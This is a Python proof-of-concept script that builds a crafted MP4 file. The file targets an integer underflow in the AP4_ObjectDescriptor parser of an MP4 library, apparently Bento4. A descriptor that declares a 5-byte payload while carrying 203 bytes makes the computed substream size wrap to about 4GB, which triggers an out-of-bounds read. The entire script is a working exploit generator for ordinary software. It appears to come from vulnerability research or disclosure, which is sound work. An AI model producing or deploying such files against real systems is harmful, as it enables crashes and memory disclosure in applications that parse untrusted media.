#!/usr/bin/env python3
"""
PoC generator for VULN 001: Integer Underflow in AP4_ObjectDescriptor
Substream Size -> Out-of-Bounds Read

In AP4_ObjectDescriptor::AP4_ObjectDescriptor (Ap4ObjectDescriptor.cpp lines 94-96),
after reading the url fields from the stream, the code computes:
    substream_size = payload_size - AP4_Size(offset - start)
If (offset - start) > payload_size (both unsigned), the subtraction underflows to ~4GB,
creating a substream that thinks it can read ~4GB of data past the actual bounds.
"""

import struct
import sys
import os

POC_DIR = os.path.dirname(os.path.abspath(__file__))
OUT_FILE = os.path.join(POC_DIR, "vuln_001.mp4")


def make_box(type_str, data):
    """Create an MP4 box: 4B big-endian size + 4B ASCII type + data."""
    size = 8 + len(data)
    return struct.pack(">I", size) + type_str.encode("ascii") + data


def make_fullbox(type_str, version, flags, data):
    """Create a FullBox: box header + 1B version + 3B flags + data."""
    # flags is 24-bit, pack as 3 bytes
    flags_bytes = struct.pack(">I", flags)[1:]  # drop the high byte
    inner = struct.pack(">B", version) + flags_bytes + data
    return make_box(type_str, inner)


def build_mp4():
    # -------------------------------------------------------------------
    # ftyp box
    # -------------------------------------------------------------------
    ftyp_data = (
        b"mp42"                   # major brand
        + struct.pack(">I", 0)   # minor version
        + b"isom"                 # compatible brand
    )
    ftyp = make_box("ftyp", ftyp_data)

    # -------------------------------------------------------------------
    # mvhd box (version 0, minimal valid)
    # Size breakdown:
    #   8B box hdr + 4B fullbox hdr + 4+4+4+4 timestamps/timescale/dur
    #   + 4B rate + 2B volume + 10B reserved + 36B matrix + 24B pre-defined
    #   + 4B next_track_id  = 108 bytes total
    # -------------------------------------------------------------------
    mvhd_inner = (
        struct.pack(">IIII",
                    0,          # creation_time
                    0,          # modification_time
                    1000,       # timescale
                    0)          # duration
        + struct.pack(">I", 0x00010000)  # rate = 1.0
        + struct.pack(">H", 0x0100)      # volume = 1.0
        + b"\x00" * 10                   # reserved
        + struct.pack(">9i",             # 3x3 matrix
                      0x00010000, 0, 0,
                      0, 0x00010000, 0,
                      0, 0, 0x40000000)
        + b"\x00" * 24                   # pre-defined
        + struct.pack(">I", 0xFFFFFFFF)  # next_track_id
    )
    mvhd = make_fullbox("mvhd", 0, 0, mvhd_inner)

    # -------------------------------------------------------------------
    # iods FullBox containing a crafted OD descriptor (tag 0x01)
    #
    # Expandable class size encoding:
    #   - Single byte 0x05  -> declared payload_size = 5
    #
    # OD descriptor bits field (16-bit BE):
    #   bits[15:6] = ObjectDescriptorID (10 bits) -> 1
    #   bits[5]    = URL_Flag -> 1  (triggers url_length + url read)
    #   bits[4:0]  = reserved -> 0
    #   value: (1 << 6) | (1 << 5) = 0x0060
    #
    # After reading bits(2B) + url_length(1B) + url(200B) = 203 bytes,
    # the code computes:
    #   substream_size = payload_size - (offset - start)
    #                  = 5 - 203  (both AP4_Size = uint32)
    #                  = 4294967098  (~4 GB)  <- integer underflow!
    # -------------------------------------------------------------------
    DECLARED_PAYLOAD_SIZE = 5
    URL_FLAG = 1
    OD_ID = 1
    # bits = OD_ID(10 bits) | URL_Flag(1 bit) | reserved(5 bits, all 0)
    bits_value = (OD_ID << 6) | (URL_FLAG << 5)  # = 0x0060
    url_length = 200
    url_bytes = b"\x41" * url_length  # 'A' * 200

    descriptor_payload = (
        struct.pack(">H", bits_value)    # 2 bytes
        + struct.pack(">B", url_length)  # 1 byte
        + url_bytes                      # 200 bytes  (total payload read: 203 bytes)
    )
    # Expandable descriptor encoding: tag(1B) + size(1B) + payload
    descriptor = (
        bytes([0x01])                        # tag = OD (0x01)
        + bytes([DECLARED_PAYLOAD_SIZE])     # declared payload_size = 5
        + descriptor_payload                 # actual payload bytes written (203B)
    )
    iods = make_fullbox("iods", 0, 0, descriptor)

    # -------------------------------------------------------------------
    # moov box
    # -------------------------------------------------------------------
    moov_data = mvhd + iods
    moov = make_box("moov", moov_data)

    # -------------------------------------------------------------------
    # mdat box - padding so the file stream has data past the iods for
    # the substream to (attempt to) read, making the OOB read observable
    # -------------------------------------------------------------------
    mdat_data = b"\x00" * 256
    mdat = make_box("mdat", mdat_data)

    return ftyp + moov + mdat


def main():
    mp4_bytes = build_mp4()
    with open(OUT_FILE, "wb") as f:
        f.write(mp4_bytes)
    print(f"Written {len(mp4_bytes)} bytes to {OUT_FILE}")
    print(f"Trigger: OD descriptor tag=0x01, declared payload_size=5, "
          f"url_length=200 -> underflow to ~4GB substream size")


if __name__ == "__main__":
    main()
